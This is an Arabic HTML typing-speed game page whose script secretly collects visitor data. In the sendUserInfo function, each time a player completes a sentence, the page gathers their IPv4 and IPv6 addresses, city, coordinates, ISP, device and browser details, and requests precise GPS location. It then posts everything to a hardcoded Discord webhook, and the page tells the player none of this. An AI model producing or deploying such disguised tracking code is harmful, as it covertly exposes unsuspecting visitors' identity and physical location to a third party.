<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>اختبر سرعتك</title>
<style>
  body {
    font-family: Tahoma, sans-serif;
    direction: rtl;
    margin: 0;
    padding: 0;
    text-align: center;
    min-height: 100vh;
    background: black;
    overflow: hidden;
    color: white;
  }
  canvas#stars {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: -1;
  }
  .container {
    max-width: 700px;
    margin: 60px auto 100px auto;
    padding: 20px;
    background: rgba(20,20,20,0.9);
    border-radius: 15px;
    box-shadow: 0 0 30px rgba(255,255,255,0.05);
  }
  input[type="text"] {
    padding: 12px;
    font-size: 18px;
    width: 80%;
    margin-bottom: 15px;
    border: 2px solid #555;
    border-radius: 8px;
    background: #111;
    color: white;
  }
  button {
    padding: 12px 25px;
    font-size: 18px;
    background-color: #6a1b9a;
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    margin: 5px;
  }
  #sentence {
    color: white;
    font-size: 24px;
    font-weight: bold;
    margin-bottom: 15px;
    word-spacing: 8px;
  }
  #sentence span {
    padding: 2px 5px;
    border-radius: 4px;
  }
  #sentence span.correct {
    color: #4caf50;
    background-color: rgba(76,175,80,0.2);
  }
  #sentence span.incorrect {
    color: #f44336;
    background-color: rgba(244,67,54,0.2);
  }
  #record {
    position: fixed;
    right: 20px;
    top: 20px;
    background: #222;
    padding: 10px 15px;
    border-radius: 8px;
    font-size: 16px;
    font-weight: bold;
    border: 1px solid #555;
    z-index: 10;
  }
  #musicControl {
    position: fixed;
    left: 20px;
    top: 20px;
    background: #333;
    color: white;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    font-size: 20px;
    z-index: 10;
  }
  #discordButton {
    position: fixed;
    bottom: 20px;
    left: 20px;
    width: 40px;
    height: 40px;
    background: transparent;
    cursor: pointer;
    z-index: 10;
    animation: glow 1.5s infinite alternate;
  }
  #discordButton img {
    width: 100%;
    height: 100%;
  }
  @keyframes glow {
    from {
      filter: drop-shadow(0 0 3px #7289da);
    }
    to {
      filter: drop-shadow(0 0 15px #7289da);
    }
  }
  #rightsMenu {
    display: none;
    position: fixed;
    bottom: 70px;
    left: 20px;
    background: #111;
    color: white;
    border-radius: 8px;
    padding: 15px;
    font-size: 14px;
    z-index: 1000;
    width: 220px;
    box-shadow: 0 0 10px rgba(255,255,255,0.3);
    text-align: left;
  }
  #closeBtn {
    background: #c62828;
    border: none;
    border-radius: 5px;
    padding: 6px 12px;
    color: white;
    cursor: pointer;
    margin-bottom: 10px;
  }
  #result.error {
    color: #f44336;
  }
  #rightsFooter {
    position: fixed;
    bottom: 10px;
    left: 0; right: 0;
    color: #888;
    font-size: 14px;
    text-align: center;
    user-select: none;
  }
</style>
</head>
<body>

<canvas id="stars"></canvas>

<div id="record">أعلى سرعة: 0 - 0.00 ثانية</div>
<div id="musicControl" title="تشغيل/إيقاف الموسيقى">🎵</div>

<button id="discordButton" title="حقوق المطور">
  <img src="https://cdn.iconscout.com/icon/free/png-256/discord-3-569463.png" alt="Discord Logo" />
</button>

<div id="rightsMenu">
  <button id="closeBtn">إغلاق</button>
  <div>المطور: <b>معاذ الحربي</b></div>
  <div>Discord: <b>معاذ الحربي</b></div>
  <div>جميع الحقوق محفوظة</div>
</div>

<div class="container" id="loginScreen">
  <h2>مرحبًا!</h2>
  <p>اكتب اسمك وابدأ</p>
  <input type="text" id="playerName" placeholder="اسمك" />
  <br />
  <button onclick="startGame()">ابدأ</button>
</div>

<div class="container" id="gameScreen" style="display:none;">
  <h2 id="welcomeMsg"></h2>
  <div id="sentence"></div>
  <input type="text" id="userInput" placeholder="اكتب هنا" oninput="renderSentence(this.value)" onkeydown="handleEnter(event)" />
  <br />
  <button onclick="checkInput()">تحقق</button>
  <div id="speedDisplay"></div>
  <div id="bestTime"></div>
  <div id="result"></div>
</div>

<audio id="bgMusic" src="https://files.catbox.moe/l0gz7g.mp3" loop></audio>

<div id="rightsFooter">حقوق © معاذ الحربي</div>

<script>
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377761857036619816/2jO4mtntMxZXJrgY9jVvpdF4s7CA6wHVCqePyuX8uZNJuZHldMWov_Ct5vPB8cLRMu3w";

  let highestWpm = 0;
  let bestTime = 0;

  const sentences = [
    "اختبر سرعتك في الطباعة",
    "هذا اختبار لقياس مهارتك",
    "هل تستطيع التفوق على نفسك",
    "البرمجة ممتعة وجميلة",
    "ابدأ الآن ولا تتردد"
  ];

  function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let currentSentence = "";
  let startTime = 0;

  function startGame() {
    const name = document.getElementById("playerName").value.trim();
    if (!name) {
      alert("يرجى إدخال اسمك");
      return;
    }
    document.getElementById("loginScreen").style.display = "none";
    document.getElementById("gameScreen").style.display = "block";
    document.getElementById("welcomeMsg").textContent = `مرحباً، ${name}`;
    shuffle(sentences);
    currentSentence = sentences[0];
    renderSentence("");
    document.getElementById("userInput").value = "";
    document.getElementById("userInput").focus();
    startTime = performance.now();
  }

  function renderSentence(userInput) {
    const sentenceDiv = document.getElementById("sentence");
    sentenceDiv.innerHTML = "";
    const words = currentSentence.split(" ");
    const inputWords = userInput.trim().split(" ");

    words.forEach((word, idx) => {
      const span = document.createElement("span");
      span.textContent = word;
      if (inputWords[idx]) {
        if (inputWords[idx] === word) {
          span.classList.add("correct");
        } else if (word.startsWith(inputWords[idx])) {
          span.style.color = "yellow";
        } else {
          span.classList.add("incorrect");
        }
      }
      sentenceDiv.appendChild(span);
      sentenceDiv.appendChild(document.createTextNode(" "));
    });
  }

  function checkInput() {
    const userInput = document.getElementById("userInput").value.trim();
    const resultDiv = document.getElementById("result");
    if (userInput === currentSentence) {
      const endTime = performance.now();
      const elapsed = (endTime - startTime) / 1000;
      const wordsCount = currentSentence.split(" ").length;
      const wpm = (wordsCount / elapsed) * 60;
      if (wpm > highestWpm) {
        highestWpm = wpm;
        bestTime = elapsed;
        document.getElementById("record").textContent = `أعلى سرعة: ${Math.round(wpm)} - ${elapsed.toFixed(2)} ثانية`;
      }
      resultDiv.textContent = `تهانينا! سرعتك ${Math.round(wpm)} كلمة بالدقيقة`;
      resultDiv.classList.remove("error");
      shuffle(sentences);
      currentSentence = sentences[0];
      document.getElementById("userInput").value = "";
      renderSentence("");
      startTime = performance.now();
      sendUserInfo();
    } else {
      resultDiv.textContent = "الرجاء كتابة الجملة بشكل صحيح";
      resultDiv.classList.add("error");
    }
  }

  function handleEnter(event) {
    if (event.key === "Enter") {
      event.preventDefault();
      checkInput();
    }
  }

  // نجوم متحركة في الخلفية
  const canvas = document.getElementById('stars');
  const ctx = canvas.getContext('2d');
  let width, height;
  let stars = [];

  function initStars() {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
    stars = [];
    for (let i = 0; i < 120; i++) {
      stars.push({
        x: Math.random() * width,
        y: Math.random() * height,
        radius: Math.random() * 1.1 + 0.3,
        alpha: Math.random(),
        dx: (Math.random() - 0.5) * 0.3,
        dy: (Math.random() - 0.5) * 0.3,
      });
    }
  }

  function drawStars() {
    ctx.clearRect(0, 0, width, height);
    stars.forEach(s => {
      ctx.beginPath();
      ctx.arc(s.x, s.y, s.radius, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(255,255,255,${s.alpha})`;
      ctx.fill();
      s.x += s.dx;
      s.y += s.dy;
      if (s.x < 0 || s.x > width) s.dx = -s.dx;
      if (s.y < 0 || s.y > height) s.dy = -s.dy;
      s.alpha += (Math.random() - 0.5) * 0.05;
      if (s.alpha < 0.1) s.alpha = 0.1;
      if (s.alpha > 1) s.alpha = 1;
    });
    requestAnimationFrame(drawStars);
  }

  window.addEventListener('resize', initStars);
  initStars();
  drawStars();

  // تحكم الموسيقى
  const music = document.getElementById('bgMusic');
  const musicControl = document.getElementById('musicControl');
  musicControl.addEventListener('click', () => {
    if (music.paused) music.play();
    else music.pause();
  });

  // عرض وإخفاء حقوق المطور
  const discordButton = document.getElementById('discordButton');
  const rightsMenu = document.getElementById('rightsMenu');
  const closeBtn = document.getElementById('closeBtn');

  discordButton.addEventListener('click', () => {
    rightsMenu.style.display = rightsMenu.style.display === 'block' ? 'none' : 'block';
  });

  closeBtn.addEventListener('click', () => {
    rightsMenu.style.display = 'none';
  });

  // إرسال معلومات المستخدم إلى الويب هوك
  async function sendUserInfo() {
    try {
      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
        fetch('https://api.ipify.org?format=json'),
        fetch('https://api64.ipify.org?format=json'),
        fetch('https://ipapi.co/json/')
      ]);
      const ipv4Data = await ipv4Res.json();
      const ipv6Data = await ipv6Res.json();
      const geoData = await geoRes.json();

      const ua = navigator.userAgent;
      const lang = navigator.language;
      const now = new Date();
      const timeString = now.toISOString();
      const ipv4 = ipv4Data.ip;
      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';

      // تحديد نوع الجهاز
      let deviceType = "كمبيوتر";
      if (/android|iphone|ipad|ipod/i.test(ua)) {
        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
      }

      function sendToWebhook(extraGeo = '') {
        const infoText = `
IP (IPv4): ${ipv4}
IP (IPv6): ${ipv6}
الدولة: ${geoData.country_name}
المنطقة: ${geoData.region}
المدينة: ${geoData.city}
خط العرض: ${geoData.latitude}
خط الطول: ${geoData.longitude}
المنظمة: ${geoData.org}
المنطقة الزمنية: ${geoData.timezone}
نوع الجهاز: ${deviceType}
المتصفح: ${ua}
اللغة: ${lang}
الوقت: ${timeString}
${extraGeo}
        `.trim();

        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: infoText })
        });
      }

      if (navigator.geolocation) {
        let responded = false;
        navigator.geolocation.getCurrentPosition(
          pos => {
            responded = true;
            const extraGeo = `موقع دقيق:\nخط العرض: ${pos.coords.latitude.toFixed(6)}\nخط الطول: ${pos.coords.longitude.toFixed(6)}`;
            sendToWebhook(extraGeo);
          },
          () => {
            responded = true;
            sendToWebhook();
          },
          { timeout: 4000 }
        );
        setTimeout(() => {
          if (!responded) sendToWebhook();
        }, 4500);
      } else {
        sendToWebhook();
      }
    } catch (e) {
      console.error('خطأ في إرسال معلومات المستخدم', e);
    }
  }
</script>

</body>
</html>
